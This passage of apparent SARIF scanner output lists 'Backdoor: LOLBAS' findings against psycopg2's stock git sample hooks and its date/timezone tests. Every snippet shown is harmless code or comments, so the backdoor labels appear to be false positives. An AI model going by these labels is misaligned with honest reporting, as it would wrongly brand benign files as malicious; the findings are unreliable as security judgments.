                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 25,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 40,
                  "endLine": 36,
                  "endColumn": 45,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 36,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 21,
                  "endLine": 35,
                  "endColumn": 26,
                  "snippet": {
                    "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                    "rendered": {
                      "text": "# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n",
                      "markdown": "`# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 58,
                  "endLine": 34,
                  "endColumn": 64,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 38,
                  "endLine": 34,
                  "endColumn": 43,
                  "snippet": {
                    "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                    "rendered": {
                      "text": "# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n",
                      "markdown": "`# index to bring them to the desired state when the tip of the current\n# branch is updated to the new commit, and exit with a zero status.\n#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 63,
                  "endLine": 6,
                  "snippet": {
                    "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                    "rendered": {
                      "text": "\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n",
                      "markdown": "`\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 58,
                  "endLine": 3,
                  "endColumn": 63,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 40,
                  "endLine": 122,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 11,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 39,
                  "endLine": 89,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                    "rendered": {
                      "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                      "markdown": "`\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 21,
                  "endLine": 34,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                    "rendered": {
                      "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                      "markdown": "`\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-applypatch.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/hooks/pre-receive.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 231,
                  "startColumn": 63,
                  "endLine": 231,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        self.check_datetime_tz(\"+01:15\", 4500)\n        self.check_datetime_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_datetime_tz(\"+01:15:00\", 60 * (60 + 15))\n",
                    "rendered": {
                      "text": "        self.check_datetime_tz(\"+01:15\", 4500)\n        self.check_datetime_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_datetime_tz(\"+01:15:00\", 60 * (60 + 15))\n",
                      "markdown": "`        self.check_datetime_tz(\"+01:15\", 4500)\n        self.check_datetime_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_datetime_tz(\"+01:15:00\", 60 * (60 + 15))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 19,
                  "endLine": 197,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        value = self.DATETIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n",
                    "rendered": {
                      "text": "\n        value = self.DATETIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n",
                      "markdown": "`\n        value = self.DATETIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 63,
                  "endLine": 170,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        self.check_time_tz(\"+01:15\", 4500)\n        self.check_time_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_time_tz(\"+01:15:00\", 60 * (60 + 15))\n",
                    "rendered": {
                      "text": "        self.check_time_tz(\"+01:15\", 4500)\n        self.check_time_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_time_tz(\"+01:15:00\", 60 * (60 + 15))\n",
                      "markdown": "`        self.check_time_tz(\"+01:15\", 4500)\n        self.check_time_tz(\"-01:15\", -4500)\n        if sys.version_info < (3, 7):\n            # The Python < 3.7 datetime module does not support time zone\n            # offsets that are not a whole number of minutes.\n            # We round the offset to the nearest minute.\n            self.check_time_tz(\"+01:15:00\", 60 * (60 + 15))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 9,
                  "endLine": 161,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n        # Time portion is correct.\n        self.assertEqual(value.replace(tzinfo=None), base)\n\n    def test_parse_time_timezone(self):\n",
                    "rendered": {
                      "text": "        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n        # Time portion is correct.\n        self.assertEqual(value.replace(tzinfo=None), base)\n\n    def test_parse_time_timezone(self):\n",
                      "markdown": "`        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n        # Time portion is correct.\n        self.assertEqual(value.replace(tzinfo=None), base)\n\n    def test_parse_time_timezone(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 157,
                  "startColumn": 19,
                  "endLine": 157,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        value = self.TIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n",
                    "rendered": {
                      "text": "\n        value = self.TIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n",
                      "markdown": "`\n        value = self.TIME(base_str + str_offset, self.curs)\n\n        # Value has time zone info and correct UTC offset.\n        self.assertNotEqual(value.tzinfo, None),\n        self.assertEqual(value.utcoffset(), timedelta(seconds=offset))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_dates.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
